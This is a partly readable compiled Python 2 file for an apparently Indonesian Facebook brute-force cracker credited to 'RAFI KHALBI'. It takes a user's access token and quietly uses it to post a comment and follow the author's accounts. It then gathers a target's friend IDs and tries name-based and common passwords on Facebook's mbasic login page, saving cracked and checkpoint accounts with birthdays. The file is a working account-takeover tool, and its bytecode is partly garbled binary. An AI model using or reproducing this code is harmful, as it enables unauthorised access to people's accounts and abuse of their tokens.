ó
ëŕac           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z y( d  d l Z d  d l Z d  d l Z Wn e k
 ru d GHd GHn Xy4 d  d l m	 Z	 d  d l
 m
 Z
 d  d l m Z Wn e	 k
 rÂ d GHn Xd a g  Z g  Z d	 Z d
 Z d Z d Z d Z d Z d Z d Z y e j d  j Z Wn# e	 k
 r@d GHe j d  n Xd Z d   Z d Z d   Z d   Z  d   Z! d   Z" d   Z# e$ d k re   n  d S(   i˙˙˙˙Ns&    [-] module requests belum terinstall s+    [-] silahkan ketik > pip2 install requests(   t   ConnectionError(   t   datetime(   t
   ThreadPools$    [-] check your internet Connection i    s   [1;93ms   [1;92ms   [1;101ms   [0ms   [1;91ms   [1;96msz   NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420t
   rafianonyms   https://api.ipify.orgs'   
 [!] check your internet Connection !
i   s3   __________________________________________________
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
gš?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   i(    (    s   /sdcard/bfr.pyt   jalan1   s    s_  
[1;96m ______   _______  ______  
([1;96m____  \ (_______)(_____ \ 	[0m[ [1;91mRAFI KHALBI[0m ]
 [1;96m____)  ) _____    _____) )
[1;96m|  __  ( |  ___)  |  __  / 
[1;96m| |__)  )| |      | |  \ \ 
[1;96m|______/ |_|      |_|   |_|
[1;101m[1;97mCreat by : RAFI1990 => 7 November 2021[0m
__________________________________________________
c          C   s×   t  j d  y t d d  }  t   WnŠ t t f k
 rŇ t GHd GHd GHt d  } | d k r d GHt j	 d	  t
   qÓ | d
 k s | d k r˘ t   qÓ | d k rČ t d  t  j d  qÓ t
   n Xd  S(   Nt   clears   login_r.txtt   rs    [1] login with token facebook s    [0] exit 
s    [[101m[1;97m?[0m] pilih : t    s   
 [!] mohon di isi i   t   1t   01t   0s    [R] silahkan kembali lagi t   exit(   t   ost   systemt   opent   menut   KeyErrort   IOErrort	   rafi_logot	   raw_inputR   R	   t   logint   tokenzR   (   t   tokent   met_log(    (    s   /sdcard/bfr.pyR   B   s&     


c          C   sČ   t  j d  t GHy t d d  }  Wn t t f k
 rĂ t d  }  y` t j d |   } t	 j
 | j  } t d d  } | j |   | j   t   t d  WqÄ t k
 rż d GHqÄ Xn Xd  S(	   NR   s   login_r.txtR   s    [[101m?[0m] token : s+   https://graph.facebook.com/me?access_token=t   ws    [!] login succes....s    [!] token salah (   R   R   R   R   R   R   R   t   requestst   gett   jsont   loadst   textR   t   closet   follow_my_accountR   (   R   t   otwt   at   avsid(    (    s   /sdcard/bfr.pyR   W   s     
c          C   s   y t  d d  j   }  Wn- t k
 rH d GHt d  t j d  n Xd } t j d | d |   t j d	 |   t j d
 |   t   d  S(   Ns   login_r.txtR   s    invalid token ! s    please login agains   rm -rf login_r.txts   lopyu bang rafis=   https://graph.facebook.com/148068940881574/comments/?message=s   &access_token=sD   https://graph.facebook.com/100070354054405/subscribers?access_token=sD   https://graph.facebook.com/100067770738028/subscribers?access_token=(	   R   t   readR   R   R   R   R!   t   postR   (   R   t   kom_r(    (    s   /sdcard/bfr.pyR'   i   s    
c          C   s?  t  j d  y t d d  j   a Wn< t k
 rd t d  t  j d  t  j d  t   n Xy= t j	 d t  }  t
 j |  j  } | d } | d } WnW t k
 rŕ t  j d  t d	  t  j d  t   n t j j k
 rű d
 GHn Xt GHd t t | f GHd t t t f GHd t t | f GHd t t f GHd t t f GHd t t f GHt d  } | d k s| d k rt   nŠ | d k sŞ| d k rŘt d  t j d  t  j d  t   nc | d k rţt d  t  j d  n= | d k s| d k r*t d  t   n t d  t   d  S(   NR   s   login_r.txtR   s    [!] token invalid s   rm -rf login_r.txts,   https://graph.facebook.com/me/?access_token=t   namet   ids    [!] invalid token s$    [!] check your Internet connection s    [%s-%s] facebook user : %ss    [%s-%s] ip user : %ss    [%s-%s] id user : %s
s    [%s1%s] start crack s    [%s2%s] hapus token s    [%s0%s] logout
 s    [?] pilih : R   R   t   2t   02s    [!] menghapus token....i   R   s    [!] silahkan datang kembali R   R   t    s    [!] harap di isi s"    [!] hanya pilih yang ada di menu (   R   R   R   R+   R   R   R   R   R!   R"   R#   R$   R%   R   t
   exceptionsR    R   t   mlt   rat   ipt   hjt   kut   mR   t   crackR   R	   R   (   R(   R)   t   namaR/   t   asw(    (    s   /sdcard/bfr.pyR   v   sV    



	

 




c    
      C   sh  t  j d  t GHy t d d  j   a Wn t k
 rJ d GHt   n Xt d  }  y1 t	 j
 d |  d t  } t j | j  } Wn t k
 rĽ t d  n Xt	 j
 d |  d	 t  } t j | j  } x; | d
 D]/ } | d } | d } t j | d |  qŢ Wd t t t   GHt GHd GHt GHd   } t d  }	 |	 j | t  t d  d  S(   NR   s   login_r.txtR   s    [!] invalid token s"    [[101m[1;97m?[0m] ID Public : s   https://graph.facebook.com/s   ?access_token=s    [!] Id tidak ditemukan s   /friends?access_token=t   dataR/   R.   s   <=>s"    [[101m[1;97m-[0m] Total ID  : s'    		[1;101m[1;97mCTRL + Z FOR STOP[0mc      	   S   s×  g  } t  j j d t t t t  f  t  j j   y t j	 d  Wn t
 k
 rZ n X|  j d  \ } } x| j d  D]ó } t |  d k  r q q t |  d k rć t |  d k rć t |  d k rć t |  d k sř t |  d	 k rL| j |  | j | d
  | j | d  | j | d  | j | d  q | j d  | j d  | j d  q WyRxA| D]9} | j   } t j d d i | d 6| d 6d d 6d i t d 6} | j } d | k sëd | k rUd | d | d d f GHt j | d |  t j d t |  d t |  d   t j   Pqn  d! | k ryĎ t d"  j   a d# | d$ t } t j |  j   }	 |	 d% j d& d'  }
 |	 d( } d) | d* | d* |
 GHt j | d* | d* |
  t j d+ t |  d* t |  d* |
 d   t j   PWn# t t f k
 rOd }
 n n Xd, | d* | d GHt j | d |  t j d+ t |  d* t |  d   t j   PqqqWt d 7a Wn n Xd  S(-   Ns)    [%sC] berjalan %s - %s please wait.. ! t   resultss   <=>R2   i   i   i   i   i   t   12t   123t   1234t   12345t   sayangt   kontolt	   bismillahs%   https://mbasic.facebook.com/login.phpR=   t   emailt   passt   submitR   t   headerss
   user-agentt   mbasic_logout_buttons   save-devices     ==-[ t   |s          s   ]-==s	     [ OK ] s   
t
   checkpoints   login_r.txts   https://graph.facebook.com/s   ?access_token=t   birthdayt   /t   -R.   s     [1;96m[ CP ] s    <-> s	     [ CP ] s     [1;96m [ CP ] (    R   R   R   R5   t   loopt   lenR/   R   R   t   mkdirt   OSErrort   splitt   appendt   lowerR!   R,   t   uat   contentt   okt   savet   strR&   R   R+   R   t   sR"   R#   t   replacet   cpR   R   (   t   usert   ra_pwt   rax_xR.   t   sst   pwt   rext   xot   urlR=   t   tgllhrR;   (    (    s   /sdcard/bfr.pyt   mainž   st    	  Z7	)

1
	 )

i   s    
[!] selesai (   R   R   R   R   R+   R   R   R   R   R!   R"   R#   R$   R%   R   R   R/   RU   R[   RQ   t   garisR   t   mapR   (
   t   ra_idt   pokt   spR   R
   R   Ra   R.   Rh   t   p(    (    s   /sdcard/bfr.pyR:   ¤   s6    

	<t   __main__(%   R   R   t   randomR   t   reR#   R!   t   ImportErrort   requests.exceptionsR    R   t   multiprocessing.poolR   RP   R/   R`   R8   R7   R4   R5   R9   t   bmRW   t   pw_rafiR"   R%   R6   R	   Ri   R   R   R   R   R'   R   R:   t   __name__(    (    (    s   /sdcard/bfr.pyt   <module>   sT   		 					.	Z


	MY NAME RAFI KHALBI !